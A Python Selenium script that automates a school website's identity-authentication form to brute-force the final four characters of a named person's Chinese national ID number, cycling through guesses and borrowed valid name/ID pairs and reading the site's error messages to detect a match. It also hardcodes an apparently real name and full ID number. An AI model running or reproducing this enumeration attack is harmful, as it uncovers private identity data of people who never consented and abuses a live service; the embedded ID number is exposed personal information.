from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os
import time
import random


idList = [
    ['...','...'],['...','..'],['..','..'],['..','..'],['..','..']
] # some right ids



name = 'name you want to get its id'
gender = 'unknow'
id_14number = '  '


driver_path = r"chromedriver.exe"

options = Options()
options.add_argument("--user-data-dir=C:\\Users\\Administrator\\AppData\\Local\\google\\Chrome\\User Data\\")
service = Service(driver_path)
driver = webdriver.Chrome(service=service, options=options)  # 使用Service来指定驱动路径

driver.get("https://www.jinshuschool.com/views/m/profileInfo/authentication.vpage")

time.sleep(3)

driver.find_element(By.XPATH, "/html/body/div/div/div/div[1]/div[1]/input").send_keys(name)
paName_iput=driver.find_element(By.XPATH, "/html/body/div/div/div/div[1]/div[3]/input")
paName_iput.send_keys("罗旋")
paid_iput=driver.find_element(By.XPATH, "/html/body/div/div/div/div[1]/div[4]/input")
paid_iput.send_keys("321324198807166036")
driver.find_element(By.XPATH, "/html/body/div/div/div/div[1]/div[5]/img").click()
time.sleep(0.2)
driver.find_element(By.XPATH, "/html/body/div/div/div/div[3]/div[2]/ul/li[1]").click()


id_input=driver.find_element(By.XPATH, "/html/body/div/div/div/div[1]/div[2]/input")
save_bt = driver.find_element(By.XPATH, "/html/body/div/div/div/div[2]/div")

times=0
may_right = []

getReal = False
for i in range(10000):
    code = f"{i:03d}"  # 生成前三位数字
    for last_char in '0123456789X':  # 最后一位可以是0-9或X
        if gender == "man" and int(code[2]) % 2 == 0:
            continue  # 如果是男性，跳过偶数
        elif gender == "woman" and int(code[2]) % 2 != 0:
            continue  # 如果是女性，跳过奇数
        elif code == '000' and last_char == '3' or last_char == '4':
            continue  # "0003" 错误

        try_id = id_14number + code + last_char
        
        id_input.clear()  # 清空输入框
        id_input.send_keys(try_id)  # 输入新的信息

        random_pa = random.choice(idList)

        paName_iput.clear()  # 清空输入框
        paName_iput.send_keys(random_pa[0])  # 输入新的信息

        paid_iput.clear()  # 清空输入框
        paid_iput.send_keys(random_pa[1])  # 输入新的信息

        time.sleep(0.1)
        save_bt.click()

        time.sleep(1.2)
        
        try:
            element = driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[1]/p")
            if element.text[0:4] == '*请填写' and element.text[0:6] != '*请填写真实':
                print(try_id + ':  ' +element.text +'(失败)')
                times+=1
                if times==2:
                    print('2次错误，等待5秒')
                    time.sleep(5)
                    times=0

            else:
                getReal = True
                os.system('cls')
                print('-----------------------------------------------')
                print('正确的身份证(99%是):',try_id)
                print('-----------------------------------------------')
                break

        except:
            print('-----------------------------------------------')
            print('未检测到通知')
            print('正确的身份证（可能是）:',try_id)
            print('-----------------------------------------------')

            may_right.append(try_id)


if getReal != True:
    print('-----------------------------------------------')
    print('\n\nMay right:')
    for item in may_right:
        print(item)
time.sleep(5)
driver.quit()
os.system('pause')
